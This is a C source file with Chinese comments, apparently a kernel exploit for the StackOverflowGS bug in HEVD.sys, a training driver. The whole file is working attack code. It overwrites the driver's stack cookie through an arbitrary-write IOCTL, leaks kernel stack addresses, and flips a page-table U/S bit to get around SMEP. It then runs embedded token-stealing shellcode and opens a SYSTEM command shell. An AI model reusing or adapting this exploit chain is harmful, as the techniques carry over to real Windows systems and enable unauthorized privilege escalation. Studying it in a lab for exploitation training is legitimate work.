/*
获取 HEVD.sys 的基地址 → 获取 HEVD.sys 的 .data 段地址 → 修改 .data 段的 cookie 值 →
为 shellcode 分配空间 → 获取空间所在页 PTE 地址 → 修改 PTE 的 U/S 字段 → 清空 TLB 缓存
内核栈空间地址泄露 → 设置栈空间锚点 → 搜索锚点 → RSP 计算
覆盖栈溢出缓冲区
*/

#include "stackoverflowgs.h"

BOOL WriteData(ULONGLONG dst, ULONGLONG value) {
	HANDLE driverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (driverHandle == INVALID_HANDLE_VALUE) {
		printf("[-] FATAL: Could not open HEVD handle!\n");
		return FALSE;
	}

	_WRITE_WHAT_WHERE buffer = { 0 };
	buffer.What = &value;
	buffer.Where = (ULONGLONG*)dst;

	if (!DeviceIoControl(driverHandle, ARBITRARY_WRITE_IOCTL_CODE, &buffer, sizeof(buffer), NULL, 0, NULL, NULL)) {
		printf("[-] FATAL: Error sending IOCTL to driver!\n");
		CloseHandle(driverHandle);
		return FALSE;
	}

	CloseHandle(driverHandle);
	return TRUE;
}

BOOL ReadData(PULONGLONG dst, PULONGLONG src, DWORD size) {
	/*
	这里 size 参数默认可以被 8 整除，如果无法整除，多余的部分数据不会读取。
	*/
	HANDLE driverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (driverHandle == INVALID_HANDLE_VALUE) {
		printf("[-] FATAL: Could not open HEVD handle!\n");
		return FALSE;
	}
	for (DWORD i = 0; i < size / 8; i++) {
		_WRITE_WHAT_WHERE buffer = { 0 };
		buffer.What = src + i;
		buffer.Where = dst + i;
		//printf("Reading 0x%I64x to 0x%I64x\n", buffer.What, buffer.Where);
		if (!DeviceIoControl(driverHandle, ARBITRARY_WRITE_IOCTL_CODE, &buffer, sizeof(buffer), NULL, 0, NULL, NULL)) {
			printf("[-] FATAL: Error sending IOCTL to driver!\n");
			CloseHandle(driverHandle);
			return FALSE;
		}
	}

	CloseHandle(driverHandle);
	return TRUE;
}

ULONGLONG SearchData(ULONGLONG baseAddr, UINT baseSize, BYTE* data, UWORD dataSize) {
	BOOL found = FALSE;
	ULONGLONG addr = 0;
	UINT bufferSize = (dataSize + 7) / 8 * 8;
	PBYTE buffer = (PBYTE)VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (buffer == 0) {
		printf("[-] FATAL: Error allocating memeory for buffer in SearchData\n");
		return 0;
	}
	for (UINT i = 0; i < baseSize; i++) {
		ReadData((PULONGLONG)buffer, (PULONGLONG)(baseAddr + i), bufferSize);
		UWORD j;
		for (j = 0; j < dataSize; j++) {
			if (*(buffer + j) != *(data + j)) {
				break;
			}
		}
		if (j == dataSize) {
			found = TRUE;
			addr = baseAddr + i;
			break;
		}
	}
	return addr;
}

ULONGLONG GetDriverBase(const char *driverName) {
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	ULONGLONG driverBase = 0;

	printf("[+] Obtaining Driver Base Address!\n");
	BOOL status = EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
	if (!status) {
		printf("[-] FATAL: Error enumerating device drivers!\n");
		exit(1);
	}

	for (int i = 0; i < lpcbNeeded / sizeof(LPVOID); i++) {
		char BaseName[1024] = { 0 };
		status = GetDeviceDriverBaseNameA(lpImageBase[i], BaseName, sizeof(BaseName));
		if (!status) {
			printf("[-] FATAL: Error getting drivers base name!\n");
			exit(1);
		}

		if (strcmp(driverName, BaseName) == 0) {
			driverBase = (ULONGLONG)lpImageBase[i];
			//printf("[*] Driver base name is: %s\n", BaseName);
			printf("[+] %s is located at: 0x%I64x\n", BaseName, driverBase);
			break;
		}
	}

	return driverBase;
}

ULONGLONG CreateShellcode(void) {
	/*
		_start:
			mov rax, [gs:0x188]         ; Current thread (_KTHREAD)
			mov rax, [rax + 0xb8]       ; Current process (_EPROCESS)
			mov rbx, rax                ; Copy current process (_EPROCESS) to rbx
		__loop:
			mov rbx, [rbx + 0x448]      ; ActiveProcessLinks
			sub rbx, 0x448              ; Go back to current process (_EPROCESS)
			mov rcx, [rbx + 0x440]      ; UniqueProcessId (PID)
			cmp rcx, 4                  ; Compare PID to SYSTEM PID
			jnz __loop                  ; Loop until SYSTEM PID is found
			mov rcx, [rbx + 0x4b8]      ; SYSTEM token is @ offset _EPROCESS + 0x4b8
			and cl, 0xf0                ; Clear out _EX_FAST_REF RefCnt
			mov [rax + 0x4b8], rcx      ; Copy SYSTEM token to current process
			cleanup:
			mov rax, [gs:0x188]       ; _KPCR.Prcb.CurrentThread
			mov cx, [rax + 0x1e4]     ; KTHREAD.KernelApcDisable
			inc cx
			mov [rax + 0x1e4], cx
			mov rdx, [rax + 0x90]     ; ETHREAD.TrapFrame
			mov rcx, [rdx + 0x168]    ; ETHREAD.TrapFrame.Rip
			mov r11, [rdx + 0x178]    ; ETHREAD.TrapFrame.EFlags
			mov rsp, [rdx + 0x180]    ; ETHREAD.TrapFrame.Rsp
			mov rbp, [rdx + 0x158]    ; ETHREAD.TrapFrame.Rbp
			xor eax, eax  ;
			swapgs
			o64 sysret
	*/
	char payload[] = "\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00"
		"\x48\x89\xC3\x48\x8B\x9B\x48\x04\x00\x00\x48\x81\xEB\x48\x04\x00"
		"\x00\x48\x8B\x8B\x40\x04\x00\x00\x48\x83\xF9\x04\x75\xE5\x48\x8B"
		"\x8B\xB8\x04\x00\x00\x80\xE1\xF0\x48\x89\x88\xB8\x04\x00\x00\x65"
		"\x48\x8B\x04\x25\x88\x01\x00\x00\x66\x8B\x88\xE4\x01\x00\x00\x66"
		"\xFF\xC1\x66\x89\x88\xE4\x01\x00\x00\x48\x8B\x90\x90\x00\x00\x00"
		"\x48\x8B\x8A\x68\x01\x00\x00\x4C\x8B\x9A\x78\x01\x00\x00\x48\x8B"
		"\xA2\x80\x01\x00\x00\x48\x8B\xAA\x58\x01\x00\x00\x31\xC0\x0F\x01"
		"\xF8\x48\x0F\x07";

	LPVOID shellcode = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!shellcode) {
		printf("[-] FATAL: Unable to allocate shellcode!\n");
		exit(1);
	}
	printf("[+] Shellcode allocated at: 0x%p\n", shellcode);

	RtlMoveMemory(shellcode, payload, sizeof(payload));

	return (ULONGLONG)shellcode;
}

void GetSectionAddr(ULONGLONG fileBase, const char *secName, PULONGLONG sectionAddr, PULONGLONG sectionSize) {
	PULONGLONG buffer = (PULONGLONG)VirtualAlloc(NULL, 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (buffer == 0) {
		printf("[-] FATAL: Error allocating memeory for buffer in LocateFunc\n");
		return;
	}
	printf("[+] Locating function!\n");
	printf("[+] fileBase is 0x%I64x\n", fileBase);
	ReadData(buffer, (PULONGLONG)(fileBase + 0x3c), 8);
	ULONGLONG elfanew = *buffer & 0x00000000ffffffff;
	printf("[+] elfanew is 0x%I64x\n", elfanew);

	ReadData(buffer, (PULONGLONG)(fileBase + elfanew + 0x04 + 0x02), 8);
	ULONGLONG numberOfSections = *buffer & 0x000000000000ffff;
	printf("[+] numberOfSections is 0x%I64x\n", numberOfSections);

	ReadData(buffer, (PULONGLONG)(fileBase + elfanew + 0x04 + 0x10), 8);
	ULONGLONG sizeOfOptionalHeader = *buffer & 0x000000000000ffff;
	printf("[+] sizeOfOptionalHeader is 0x%I64x\n", sizeOfOptionalHeader);

	ULONGLONG sectionHeaderStart = fileBase + elfanew + 0x18 + sizeOfOptionalHeader;
	for (ULONGLONG i = 0; i < numberOfSections; i++) {
		ULONGLONG sectionHeader = sectionHeaderStart + i * 40;
		ReadData(buffer, (PULONGLONG)sectionHeader, 8);

		char* sectionName = (char*)malloc(6);
		if (sectionName == 0) {
			printf("[-] FATAL: Error malloc memory for sectionName!\n");
			return;
		}
		memset(sectionName, 0, 6);
		memcpy(sectionName, (char*)buffer, 5);

		if (strcmp(sectionName, secName) != 0) {
			printf("[+] Found %s section, not %s, continue...\n", sectionName, secName);
		}
		else {
			ReadData(buffer, (PULONGLONG)(sectionHeader + 0x0c), 8);
			*sectionAddr = fileBase + (*buffer & 0x00000000ffffffff);

			ReadData(buffer, (PULONGLONG)(sectionHeader + 0x08), 8);
			*sectionSize = *buffer & 0x00000000ffffffff;
			break;
		}
	}
}

ULONGLONG ChangeCookie() {
	/*
	通过重写 .data 段中的 cookie 值来绕过 /BS 防御机制。
	返回值是覆盖后的 cookie 值，方便在溢出时进行插入，并与其他绕过方法兼容。
	*/
	// 获得 HEVD 基址
	ULONGLONG hevdBaseAddr = GetDriverBase("HEVD.sys");
	if (hevdBaseAddr == 0) {
		printf("[-] Fatal: Error getting base address of HEVD.sys\n");
		return 0;
	}

	// 获得 .data 段基址
	ULONGLONG dataBase = 0, dataSize = 0;
	GetSectionAddr(hevdBaseAddr, ".data", &dataBase, &dataSize);

	
	//DWORD hevdDataSecOffset = GetDataSectionOffset(hevdFilePath);
	if (dataBase == 0) {
		printf("[-] Fatal: Error getting data section offset\n");
		return 0;
	}
	//ULONGLONG hevdDataSection = hevdBaseAddr + hevdDataSecOffset;
	printf("[+] hevdDataSection is 0x%I64x\n", dataBase);

	// 修改 .data 段的 cookie 值
	ULONGLONG newCookie = 0x0000414141414141;
	BOOL status = WriteData(dataBase, newCookie);
	if (status == FALSE) {
		printf("[-] FATAL writing newCookie at hevd data section\n");
		return 0;
	}

	return newCookie;
}

ULONGLONG LocateFunc(ULONGLONG fileBase, ULONGLONG signature) {
	ULONGLONG codeBase = 0, codeSize = 0;
	
	GetSectionAddr(fileBase, ".text", &codeBase, &codeSize);

	if (codeBase == 0 || codeSize == 0) {
		printf("[-] FATAL: Error finding .text section\n");
		return 0;
	}
	printf("[+] CodeBase is 0x%I64x\tcodeSize is 0x%I64x\n", codeBase, codeSize);
	BOOL found = FALSE;

	PULONGLONG codeBuffer = (PULONGLONG)VirtualAlloc(NULL, codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (codeBuffer == 0) {
		printf("[-] FATAL: Error allocating memory for codeBuffer!\n");
		return 0;
	}
	BOOL status = ReadData(codeBuffer, (PULONGLONG)codeBase, codeSize);
	if (status == FALSE) {
		printf("[-] FATAL: Error reading data at codeBase!\n");
		return 0;
	}
	PULONGLONG pointer = codeBuffer;
	printf("[+] Data at codeBase is 0x%I64x\n", *codeBuffer);

	while (1) {
		ULONGLONG hash = 0, tmp = 0;
		for (DWORD i = 0; i < 4; i++) {
			tmp = *(PULONGLONG)((ULONGLONG)pointer + i * 4);
			hash += tmp;
		}
		if (hash == signature) {
			found = TRUE;
			break;
		}
		pointer = (PULONGLONG)((PBYTE)pointer + 1);
	}
	if (found) {
		return (ULONGLONG)pointer;
	}
	else {
		return 0;
	}
}

ULONGLONG LocateFunc2(const char* moduleName, const char* funcName, bool isExport) {
	ULONGLONG kernelBaseAddr = GetDriverBase(moduleName);
	ULONGLONG offset = 0;
	if (kernelBaseAddr == 0) {
		printf("[-] Fatal: Error getting base address of ntoskrnl.exe\n");
		return 0;
	}

	HMODULE moduleAddr = LoadLibraryA(moduleName);
	if (moduleAddr == 0) {
		printf("[-] FATAL: Error loadlibrary of %s\n", moduleName);
		return 0;
	}
	printf("[+] %s is 0x%I64x\n", moduleName, (ULONGLONG)moduleAddr);

	BYTE* funcAddr = (BYTE*)GetProcAddress(moduleAddr, funcName);
	if (funcAddr == 0) {
		printf("[-] FATAL: Error getprocaddress of %s\n", funcName);
		FreeLibrary(moduleAddr);
		return 0;
	}
	printf("[+] %s is 0x%I64x\n", funcName, (ULONGLONG)funcAddr);

	for (ULONGLONG i = 0; i < SEARCH_LEN; i++) {
		BYTE* test = funcAddr + i;
		if (*test == 0xE8) {
			if (isExport) {
				offset = (ULONGLONG)funcAddr - (ULONGLONG)moduleAddr + i + 5;
				break;
			}
			else {
				INT* offsetAddr = (INT*)(funcAddr + i + 1);
				offset = *offsetAddr;
				//printf("offset: %x\n", offset);
				offset = offset + (ULONGLONG)funcAddr - (ULONGLONG)moduleAddr + i + 5;
				//printf("offset: %I64x\n", offset);
				break;
			}
		}
	}
	FreeLibrary(moduleAddr);
	return kernelBaseAddr + offset;
}

ULONGLONG GetPteBase(ULONGLONG signature) {
	ULONGLONG kernelBaseAddr = GetDriverBase("ntoskrnl.exe");
	if (kernelBaseAddr == 0) {
		printf("[-] Fatal: Error getting base address of ntoskrnl.exe\n");
		return 0;
	}

	//ULONGLONG MiGetPteAddress = LocateFunc(kernelBaseAddr, signature);
	//printf("MiGetPteAddress from locatefun is %I64x\n", MiGetPteAddress);
	ULONGLONG MiGetPteAddress = LocateFunc2("ntoskrnl.exe", "MmLockPreChargedPagedPool", FALSE);
	printf("MiGetPteAddress from locatefun2 is %I64x\n", MiGetPteAddress);

	if (MiGetPteAddress == 0) {
		printf("[-] FATAL: Error getting address of MiGetPteAddressAddr!\n");
		return 0;
	}
	printf("[+] Rerutn from LocateFunc!\n");

	PULONGLONG buffer = (PULONGLONG)VirtualAlloc(NULL, 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buffer) {
		printf("[-] FATAL: Unable to allocate buffer for ptebase!\n");
		return 0;
	}
	
	printf("Reading data at %I64x\n", MiGetPteAddress + 0x13);
	BOOL status = ReadData((PULONGLONG)buffer, (PULONGLONG)(MiGetPteAddress + 0x13), 8);
	if (status == FALSE) {
		printf("[-] FATAL: Error reading data at MiGetPteAddress+0x13!\n");
		return 0;
	}
	ULONGLONG pteBase = *buffer;
	printf("[+] The base address of PTE is 0x%I64x\n", pteBase);
	
	VirtualFree(buffer, 0, MEM_RELEASE);
	return pteBase;
}

ULONGLONG GetPteFromVA(ULONGLONG virtualAddr) {
	ULONGLONG pteBase = GetPteBase(0x247901102daa798f);
	if (pteBase == 0) {
		printf("[-] FATAL: Error finding pteBase\n");
		return 0;
	}

	return ((virtualAddr >> 9) & 0x7FFFFFFFF8) + pteBase;
}

BOOL ChangeUS(ULONGLONG pteAddr) {
	PULONGLONG pte = (PULONGLONG)VirtualAlloc(NULL, 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pte == 0) {
		printf("[-] FATAL: Error allocating memeory for pte\n");
		return FALSE;
	}
	ReadData(pte, (PULONGLONG)pteAddr, 8);
	ULONGLONG pteValue = *pte;
	printf("[+] Pte for shellcode is 0x%I64x\n", pteValue);

	BOOL status = WriteData(pteAddr, pteValue ^ 0x4);

	VirtualFree(pte, 0, MEM_RELEASE);
	return status;
}

BOOL LeakKernelAddr(const wchar_t* name, PULONGLONG stackLimit, PULONGLONG stackBase) {
	BOOL rtn = FALSE;
	// Query SYSTEM_EXTENDED_PROCESS_INFORMATION
	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	if (ntdll == NULL) {
		printf("[-] FATAL: Error getting module handle of ntdll.\n");
		return rtn;
	}

	PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		printf("[-] FATAL: Error get proc address of NtQuerySystemInformation.\n");
		return rtn;
	}

	ULONG len = 2000;
	NTSTATUS status = NULL;
	PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL;

	do {
		len *= 2;
		pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
		if (pProcessInfo == NULL) {
			printf("[-] FATAL: Error allocating memory for processinfo.\n");
			return rtn;
		}
		status = query(SystemExtendedProcessInformation, pProcessInfo, len, &len);
	} while (status == (NTSTATUS)0xc0000004);

	if (status != (NTSTATUS)0x0) {
		printf("[-] FATAL: Error querying system information, error code is 0x%X\n", status);
		return rtn;
	}

	// Search current process kernel stack address
	UNICODE_STRING procName;
	PRtlInitUnicodeString initUS = (PRtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
	PRtlEqualUnicodeString equalUS = (PRtlEqualUnicodeString)GetProcAddress(ntdll, "RtlEqualUnicodeString");
	if (initUS == NULL || equalUS == NULL) {
		printf("[-] FATAL: Error get proc address of RtlInitUnicodeString/RtlEqualUnicodeString\n");
		return rtn;
	}

	initUS(&procName, name);

	while (pProcessInfo != NULL) {
		if (equalUS(&(pProcessInfo->ImageName), &procName, TRUE)) {
			printf("[+] Found %wZ\n", pProcessInfo->ImageName);
			if (pProcessInfo->NumberOfThreads > 0) {
				*stackBase = (ULONGLONG)(pProcessInfo->Threads[0].StackBase);
				*stackLimit = (ULONGLONG)(pProcessInfo->Threads[0].StackLimit);
				rtn = TRUE;
				break;
			}
		}
		if (!pProcessInfo->NextEntryOffset) {
			pProcessInfo = NULL;
		}
		else {
			pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONGLONG)pProcessInfo + pProcessInfo->NextEntryOffset);
		}
	}

	return rtn;
}

ULONGLONG GetRSP() {
	ULONGLONG stackLimit, stackBase;
	if (!LeakKernelAddr(TEXT("StackOverflowGS.exe"), &stackLimit, &stackBase)) {
		printf("[-] FATAL: Error leak kernel address\n");
		return 0;
	}
	printf("[+] StackBase is 0x%I64x, StackLimit is 0x %I64x\n", stackBase, stackLimit);
	ULONGLONG anchor = LocateFunc2("ntoskrnl.exe", "NtDeviceIoControlFile", TRUE);
	printf("[+] Anchor is 0x%I64x\n", anchor);

	ULONGLONG anchorAddr = SearchData(stackLimit, stackBase - stackLimit, (BYTE*) & anchor, 8);

	printf("[+] AnchorAddr is %I64x\n", anchorAddr);

	return anchorAddr - RSP_OFFSET;
}

void exploit() {
	// Change cookie at .data
	ULONGLONG cookie = ChangeCookie();
	if (cookie == 0) {
		printf("[-] Fatal: Error bypassing GS with method1.\n");
		return;
	}
	printf("[+] New cookie value is 0x%I64x!\n", cookie);

	// Get RSP value
	ULONGLONG rsp = GetRSP();
	printf("[+] RSP is %I64x\n", rsp);

	ULONGLONG xored_cookie = cookie ^ rsp;

	// Change pte's U/S of shellcode page
	printf("[+] Creating shellcode.\n");
	ULONGLONG shellcode = CreateShellcode();
	printf("[+] Getting pte for shellcode.\n");
	ULONGLONG pteAddr = GetPteFromVA(shellcode);
	printf("[+] Pte Address of shellcode is 0x%I64x\n", pteAddr);
	printf("[+] Changing U/S of pte.\n");
	BOOL status = ChangeUS(pteAddr);
	if (status == FALSE) {
		printf("[-] FATAL: Error changing U/S of pte\n");
		return;
	}

	// wbinvd gadget address
	ULONGLONG kernelBaseAddr = GetDriverBase("ntoskrnl.exe");
	if (kernelBaseAddr == 0) {
		printf("[-] Fatal: Error getting base address of ntoskrnl.exe\n");
		return;
	}
	ULONGLONG wbinvdAddr = kernelBaseAddr + WBINVD_OFFSET;
	
	// Start to exploit
	char buffer[0x248] = { 0 };
	printf("[+] Preparing exploit buffer!\n");
	memset(buffer, 0x41, sizeof(buffer));
	// xored securty cookie
	memcpy(&buffer[COOKIE_OFFSET], &xored_cookie, 8);
	// return address
	memcpy(&buffer[RTN_OFFSET], &wbinvdAddr, 8);
	memcpy(&buffer[RTN_OFFSET+8], &shellcode, 8);
	
	printf("[+] Opening handle to %s\n", DRIVER);
	HANDLE DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (DriverHandle == INVALID_HANDLE_VALUE) {
		printf("[-] FATAL: Could not open HEVD handle!\n");
		return;
	}
	
	if (!DeviceIoControl(DriverHandle, STACK_OVERFLOWGS_IOCTL_CODE, buffer, sizeof(buffer), NULL, 0, NULL, NULL)) {
		printf("[-] FATAL: Error sending IOCTL to driver!\n");
		return;
	}
	
}

int main() {
	printf("[+] HEVD StackOverflowGS exploit\n");
	exploit();
	


	system("cmd.exe /c  cmd.exe /K cd C:\\");
	printf("[*] System Shell\n");
	//_getch();
	return 0;
}